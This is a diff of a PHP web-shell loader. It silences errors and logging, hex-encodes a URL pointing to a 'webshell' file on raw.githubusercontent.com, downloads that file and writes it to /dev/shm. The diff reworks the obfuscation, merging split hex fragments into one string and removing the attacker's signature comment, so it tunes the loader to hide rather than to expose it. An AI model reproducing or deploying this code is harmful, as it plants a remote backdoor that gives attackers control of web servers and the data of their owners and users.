@@ -2,13 +2,7 @@
 error_reporting(0);
 ini_set('display_errors', '0');
 ini_set('log_errors', '0');
-/**
- * @package    197381816.onion
- *
- * @copyright  Hackerman (Azz) .
- *
- */
-//   Does not have any logger.
+
 function geturlsinfo($url) {
     if (function_exists('curl_exec')) {
         $conn = curl_init($url);
@@ -46,12 +40,7 @@ function geturlsinfo($url) {
     return $url_get_contents_data;
 }
 
-$love = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f'; 
-$destiny = '6578706c6f69742d6861786f722f'; 
-$dream = '7765627368656c6c';
-$purpose = '2f6d61696e'; 
-$haxor = '2f77702d61616b2e70687037';
-
+$hex25tr = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f74656d706c61746562736e2e706870'; 
 function hex2str($hex) {
     $str = '';
     for ($i = 0; $i < strlen($hex); $i += 2) {
@@ -73,7 +62,7 @@ function clean_old_temp_files() {
 
 clean_old_temp_files();
 
-$url = hex2str($love) . hex2str($destiny) . hex2str($dream) . hex2str($purpose) . hex2str($haxor);
+$url = hex2str($hex25tr);
 $a = geturlsinfo($url);
 $temporary_file = tempnam('/dev/shm', 'prefix');
 file_put_contents($temporary_file, $a);
